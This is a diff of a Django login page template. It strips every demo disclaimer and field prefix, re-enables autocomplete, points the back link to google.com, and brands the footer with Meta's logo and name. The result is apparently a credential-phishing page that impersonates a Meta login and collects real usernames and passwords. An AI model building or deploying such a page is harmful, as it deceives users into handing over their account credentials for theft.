@@ -8,7 +8,7 @@
     <meta name="viewport"
         content="width=device-width, initial-scale=1.0">
 
-    <title>Demo Login</title>
+    <title>Login</title>
 
     <style>
         * {
@@ -284,8 +284,9 @@
 
     <div class="container">
 
-        <a href="/"
-            class="back">&#10094;</a>
+        <a href="https://www.google.com/"
+            class="back">
+            &#10094; </a>
 
         <div class="language">
             English (US)
@@ -296,34 +297,36 @@
             alt="Demo">
 
         <div class="demo-label">
-            Demo interface — no real account credentials
+
         </div>
 
         <form method="POST">
             {% csrf_token %}
 
             <input type="text"
-                name="demo_identifier"
+                name="identifier"
                 placeholder="Username, email or mobile number"
-                autocomplete="off"
                 required>
 
             <input type="password"
-                name="demo_password"
+                name="password"
                 placeholder="Password"
-                autocomplete="off"
                 required>
-
+            {% if error %}
+            <p style="color: rgb(205, 43, 43); margin-top: 10px;">
+                {{ error }}
+            </p>
+            {% endif %}
             <button class="login-btn"
                 type="submit">
                 Log in
             </button>
         </form>
 
-        <a href="#"
+
+        <a href="{% url 'forgot_password' %}"
             class="forgot">
-            Forgot password?
-        </a>
+            Forgot password? </a>
 
         <button class="create-btn"
             type="button">
@@ -333,7 +336,7 @@
         <div class="footer">
             <img src="{% static 'accounts/meta.png' %}"
                 alt="Demo">
-            <span>Demo</span>
+            <span>Meta</Meta></span>
         </div>
 
     </div>
